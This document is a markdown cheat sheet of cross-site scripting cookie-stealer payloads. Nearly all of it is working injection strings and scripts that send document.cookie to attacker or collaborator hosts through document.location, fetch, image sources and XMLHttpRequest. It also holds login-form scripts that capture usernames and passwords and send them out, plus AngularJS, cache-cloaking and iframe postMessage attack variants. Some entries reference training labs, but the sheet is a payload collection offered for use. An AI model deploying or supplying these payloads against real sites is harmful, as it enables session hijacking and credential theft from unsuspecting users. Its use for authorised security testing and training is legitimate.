
# CookieStealer XSS Payloads  

>XSS Cookie Stealer payloads using JavaScript

```Javascript
JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
```  

>Reflected XSS into HTML context with nothing encoded in search.  

```JavaScript
<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>
```  

>Reflected DOM XSS, into JSON data that is processed by **eval().**  

```JavaScript
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
```  

>JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.  

```JavaScript
${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}
```  

![JavaScript template string](../images/javascript-template-string.png)  

>AngularJS DOM XSS Attack **constructor** payloads  

```JavaScript
{{$on.constructor('alert(1)')()}}
```

```JavaScript
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```  
  
>HTTP request smuggling to deliver reflected XSS  

```JavaScript
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```  

>Web Cache Parameter cloaking - script ```/js/geolocate.js```, executing the callback function ```setCountryCookie()```  
  
```JavaScript
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```  

>More Cross-Site Scripting (XSS) example cookie stealer payloads.  

```JavaScript
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```

>HTML <img> Tag, with invalid Image source, with escape sequence from source code calling ```window.location``` for the **LastViewedProduct``` cookie.  

```html
&'><img src=1 onerror=print()>
```  

```html
&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>
```  

```Javascript
<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
```  

>***Document.location*** returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.  

```JavaScript
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
```  

```Javascript
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

>Document.write  

```Javascript
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
```  


```Javascript
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>
```

```Javascript
<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

```Javascript
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  }); 
</script>   
```

```Javascript
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
```

```Javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```

>OSCP Offsec PWK hand book cookie stealer example  

```Javascript
<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
```

>Alt Cookie Stealer  

```Javascript
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
```

```Javascript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```

```Javascript
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

>::::  Steal Password / Cookie Stealer ::::

>XMLHttpRequest

```html
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

>FETCH API

```Javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


>::::  DATA EXFILTRATION  /  COOKIE STEALER  ::::
```Javascript
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 
```

```Javascript
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
```

```Javascript
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
```

```Javascript
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```  

>IFRAMEs

```JavaScript
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```  

>Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.  

```
document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
```

>Prompt Validation payload, does not steal cookie or send it to exploit server.  

```html
<img src=x onerror=prompt(1)>
```  